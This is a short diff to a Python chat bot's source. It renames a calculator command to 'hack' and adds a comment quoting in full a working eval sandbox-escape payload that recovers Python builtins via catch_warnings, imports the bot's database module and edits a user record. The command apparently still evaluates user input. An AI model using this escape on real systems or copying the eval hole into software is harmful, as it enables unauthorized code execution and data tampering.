@@ -134,6 +134,18 @@ class Reference(Dendrite):
             self.chat("couldn't find anything")
 
 
+    # This function used to be called calc, but was changed to hack in
+    # honor of Ken's incredibly sick exploitation of the eval function, 
+    # which gave him direct access to the database:
+    # (lambda f=(lambda n:[c for c in ().__class__.__bases__[0].__subclasses__() 
+    # if c.__name__=='catch_warnings'][0]()._module.__builtins__[n]): 
+    # f("eval")(f("compile")("d=[c for c in ().__class__.__base__.__subclasses__() 
+    # if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('datastore');
+    # d.connectdb();e=d.Drinker.objects(name='loxo33')[0];e.awaiting='2013/5/1=loxo33 job hops';
+    # e.save()","","single")))()
+    #
+    # Ken, your kung-fu is the strongest.
+
     @axon
     @help("EQUATION <run simple equation in python>, OR ruthlessly fuck with bot's codebase.")
     def hack(self):
